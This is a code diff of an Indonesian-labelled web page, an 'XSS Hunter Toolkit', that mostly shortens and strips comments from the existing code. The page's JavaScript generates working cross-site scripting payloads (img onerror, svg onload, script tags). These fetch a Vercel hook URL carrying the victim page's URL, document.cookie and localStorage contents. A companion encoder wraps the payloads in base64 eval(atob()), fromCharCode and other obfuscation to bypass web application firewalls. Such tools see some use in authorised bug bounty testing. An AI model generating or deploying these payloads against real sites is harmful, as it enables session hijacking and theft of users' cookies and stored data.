@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XSS Hunter By Foxxy | Payload Generator + WAF Bypass</title>
+    <title>XSS Hunter Toolkit</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
@@ -89,10 +89,6 @@
             flex: 1;
             min-width: 250px;
         }
-        hr {
-            border-color: #333;
-            margin: 15px 0;
-        }
         @media (max-width: 700px) {
             .flex-row { flex-direction: column; }
         }
@@ -111,16 +107,14 @@
     <h1>🕵️ XSS Hunter Toolkit</h1>
     <div class="sub">Payload Generator + WAF Bypass + Real-time Dashboard</div>
 
-    <!-- Bagian 1: Konfigurasi Hunter -->
     <div class="card">
         <h2>⚙️ Konfigurasi Hunter</h2>
         <label>Endpoint Vercel (API Hook)</label>
-        <input type="text" id="endpoint" placeholder="https://xss-hunter-by-foxxy.vercel.app/api/hook" value="https://xss-hunter-by-foxxy.vercel.app/api/hook">
+        <input type="text" id="endpoint" value="https://xss-hunter-by-foxxy.vercel.app/api/hook">
         <label>Marker (identifikasi lokasi injeksi)</label>
-        <input type="text" id="marker" placeholder="misal: contact-form, header, level1" value="test">
+        <input type="text" id="marker" value="test">
     </div>
 
-    <!-- Bagian 2: Generator Payload (Opsi 1) -->
     <div class="card">
         <h2>📦 Generator Payload Hunter <span class="badge">Opsi 1</span></h2>
         <div class="flex-row">
@@ -133,7 +127,7 @@
                     <option value="body">🧬 Body onload</option>
                     <option value="svg">🎨 SVG onload</option>
                 </select>
-                <label>Data tambahan (cookies, localStorage, URL)</label>
+                <label>Data tambahan</label>
                 <select id="dataOption">
                     <option value="basic">Hanya marker & URL</option>
                     <option value="cookies">+ Cookies</option>
@@ -141,26 +135,25 @@
                 </select>
             </div>
             <div class="flex-col">
-                <label>Hasil Payload (copy & inject)</label>
+                <label>Hasil Payload</label>
                 <div id="generatedPayload" class="output">Pilih tipe payload...</div>
                 <button id="copyPayloadBtn" class="copy-btn">📋 Copy Payload</button>
             </div>
         </div>
     </div>
 
-    <!-- Bagian 3: WAF Bypass Encoder (Opsi 2) -->
     <div class="card">
         <h2>🔐 WAF Bypass Encoder <span class="badge">Opsi 2</span></h2>
         <div class="flex-row">
             <div class="flex-col">
-                <label>Payload mentah (dari generator atau custom)</label>
+                <label>Payload mentah</label>
                 <textarea id="rawPayload" rows="3" placeholder="Tempel payload di sini..."></textarea>
                 <label>Metode Encoding</label>
                 <select id="encodeMethod">
                     <option value="none">Tanpa encoding</option>
-                    <option value="html">HTML Entity (&#x3C;script&gt;)</option>
+                    <option value="html">HTML Entity</option>
                     <option value="url">URL Encode</option>
-                    <option value="unicode">Unicode Escape (\\u003c)</option>
+                    <option value="unicode">Unicode Escape</option>
                     <option value="hex">Hex String</option>
                     <option value="b64">Base64 + eval(atob())</option>
                     <option value="charCode">String.fromCharCode</option>
@@ -175,17 +168,14 @@
         </div>
     </div>
 
-    <!-- Informasi Dashboard -->
     <div class="card">
         <h2>📊 Dashboard Trigger <span class="badge">Opsi 4</span></h2>
         <p>Lihat semua XSS trigger yang tercatat di database.</p>
         <button id="goDashboardBtn">🚀 Buka Dashboard</button>
-        <p style="font-size: 12px; margin-top: 10px; color: #888;">Pastikan Redis database sudah di-set di Vercel (Upstash).</p>
     </div>
 </div>
 
 <script>
-    // Elemen DOM
     const endpointInput = document.getElementById('endpoint');
     const markerInput = document.getElementById('marker');
     const payloadType = document.getElementById('payloadType');
@@ -195,7 +185,6 @@
     const encodeMethod = document.getElementById('encodeMethod');
     const encodedOutputDiv = document.getElementById('encodedOutput');
 
-    // Fungsi generate payload
     function generatePayload() {
         let hookUrl = endpointInput.value.trim();
         let marker = markerInput.value.trim();
@@ -205,65 +194,47 @@
         }
         const type = payloadType.value;
         const data = dataOption.value;
-
-        // Bikin URL dasar dengan marker dan URL dinamis
-        let basePayloadUrl = `${hookUrl}?marker=${encodeURIComponent(marker)}&url=`;
-        if (data === 'basic') {
-            basePayloadUrl += `'+encodeURIComponent(window.location.href)+'`;
-        } else if (data === 'cookies') {
-            basePayloadUrl += `'+encodeURIComponent(window.location.href)+'&cookies='+encodeURIComponent(document.cookie)+'`;
-        } else {
-            basePayloadUrl += `'+encodeURIComponent(window.location.href)+'&cookies='+encodeURIComponent(document.cookie)+'&localStorage='+encodeURIComponent(JSON.stringify(localStorage))+'`;
-        }
+        let base = `${hookUrl}?marker=${encodeURIComponent(marker)}&url=`;
+        if (data === 'basic') base += `'+encodeURIComponent(window.location.href)+'`;
+        else if (data === 'cookies') base += `'+encodeURIComponent(window.location.href)+'&cookies='+encodeURIComponent(document.cookie)+'`;
+        else base += `'+encodeURIComponent(window.location.href)+'&cookies='+encodeURIComponent(document.cookie)+'&localStorage='+encodeURIComponent(JSON.stringify(localStorage))+'`;
 
         let payload = '';
         switch(type) {
             case 'img':
-                payload = `<img src=x onerror="fetch('${basePayloadUrl}')">`;
+                payload = `<img src=x onerror="fetch('${base}')">`;
                 break;
             case 'script_src':
                 payload = `<script src="${hookUrl}?marker=${encodeURIComponent(marker)}&url="+encodeURIComponent(window.location.href)+""></script>`;
                 break;
             case 'fetch':
-                payload = `<script>fetch('${basePayloadUrl}')</script>`;
+                payload = `<script>fetch('${base}')</script>`;
                 break;
             case 'body':
-                payload = `<body onload="fetch('${basePayloadUrl}')">`;
+                payload = `<body onload="fetch('${base}')">`;
                 break;
             case 'svg':
-                payload = `<svg/onload="fetch('${basePayloadUrl}')">`;
+                payload = `<svg/onload="fetch('${base}')">`;
                 break;
-            default:
-                payload = '';
         }
         generatedPayloadDiv.innerText = payload;
-        // Isi otomatis ke textarea raw payload buat encoder
         rawPayloadText.value = payload;
     }
 
-    // Fungsi encode payload
     function encodePayload() {
         let raw = rawPayloadText.value;
-        if (!raw) {
-            encodedOutputDiv.innerText = '❌ Tidak ada payload untuk di-encode';
-            return;
-        }
+        if (!raw) { encodedOutputDiv.innerText = '❌ Kosong'; return; }
         const method = encodeMethod.value;
         let encoded = raw;
         switch(method) {
             case 'html':
-                encoded = raw.replace(/[&<>]/g, function(m) {
-                    if (m === '&') return '&amp;';
-                    if (m === '<') return '&lt;';
-                    if (m === '>') return '&gt;';
-                    return m;
-                });
+                encoded = raw.replace(/[&<>]/g, m => m==='&'?'&amp;':m==='<'?'&lt;':'&gt;');
                 break;
             case 'url':
                 encoded = encodeURIComponent(raw);
                 break;
             case 'unicode':
-                encoded = raw.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('');
+                encoded = raw.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4,'0')).join('');
                 break;
             case 'hex':
                 encoded = raw.split('').map(c => '\\x' + c.charCodeAt(0).toString(16)).join('');
@@ -273,43 +244,30 @@
                 encoded = `<script>eval(atob('${b64}'))</script>`;
                 break;
             case 'charCode':
-                let charCodes = raw.split('').map(c => c.charCodeAt(0)).join(',');
-                encoded = `<script>eval(String.fromCharCode(${charCodes}))</script>`;
+                let cc = raw.split('').map(c => c.charCodeAt(0)).join(',');
+                encoded = `<script>eval(String.fromCharCode(${cc}))</script>`;
                 break;
-            default:
-                encoded = raw;
+            default: encoded = raw;
         }
         encodedOutputDiv.innerText = encoded;
     }
 
-    // Event listeners
     payloadType.addEventListener('change', generatePayload);
     dataOption.addEventListener('change', generatePayload);
     markerInput.addEventListener('input', generatePayload);
     endpointInput.addEventListener('input', generatePayload);
-    document.getElementById('copyPayloadBtn').addEventListener('click', () => {
-        const text = generatedPayloadDiv.innerText;
-        if (text && text !== 'Pilih tipe payload...') {
-            navigator.clipboard.writeText(text);
-            alert('Payload disalin!');
-        } else {
-            alert('Belum ada payload. Pilih tipe payload dulu.');
-        }
-    });
-    document.getElementById('encodeBtn').addEventListener('click', encodePayload);
-    document.getElementById('copyEncodedBtn').addEventListener('click', () => {
-        const text = encodedOutputDiv.innerText;
-        if (text && text !== '-') {
-            navigator.clipboard.writeText(text);
-            alert('Encoded payload disalin!');
-        }
-    });
-    document.getElementById('goDashboardBtn').addEventListener('click', () => {
-        window.location.href = '/dashboard.html';
-    });
-
-    // Generate awal
+    document.getElementById('copyPayloadBtn').onclick = () => {
+        const t = generatedPayloadDiv.innerText;
+        if (t && !t.includes('Pilih')) { navigator.clipboard.writeText(t); alert('Copied!'); }
+        else alert('Belum ada payload');
+    };
+    document.getElementById('encodeBtn').onclick = encodePayload;
+    document.getElementById('copyEncodedBtn').onclick = () => {
+        const t = encodedOutputDiv.innerText;
+        if (t && t !== '-') { navigator.clipboard.writeText(t); alert('Copied!'); }
+    };
+    document.getElementById('goDashboardBtn').onclick = () => location.href = '/dashboard.html';
     generatePayload();
 </script>
 </body>
-                    </html>
+                </html>
